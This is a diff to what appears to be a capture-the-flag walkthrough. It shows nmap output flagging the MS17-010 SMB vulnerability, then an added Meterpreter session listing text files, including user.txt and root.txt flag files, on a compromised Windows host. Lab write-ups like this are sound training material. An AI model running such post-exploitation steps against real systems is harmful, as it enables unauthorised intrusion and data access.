@@ -110,3 +110,20 @@ Host script results:
 |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
 ```
+
+```
+meterpreter > search -f *.txt
+Found 26 results...
+    c:\Documents and Settings\Administrator\Application Data\Microsoft\Internet Explorer\brndlog.txt (10389 bytes)
+    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
+    c:\Documents and Settings\Default User\Application Data\Microsoft\Internet Explorer\brndlog.txt (141 bytes)
+    c:\Documents and Settings\john\Application Data\Microsoft\Internet Explorer\brndlog.txt (10380 bytes)
+    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
+    c:\Program Files\Movie Maker\Shared\Empty.txt (18 bytes)
+    c:\Program Files\Movie Maker\Shared\Profiles\Blank.txt (21 bytes)
+    c:\Program Files\Outlook Express\msoe.txt (133 bytes)
+    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\drivetable.txt (130 bytes)
+    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP1\snapshot\domain.txt (26 bytes)
+    c:\WINDOWS\OEWABLog.txt (1178 bytes)
+    c:\WINDOWS\SchedLgU.Txt (1308 byte
+```
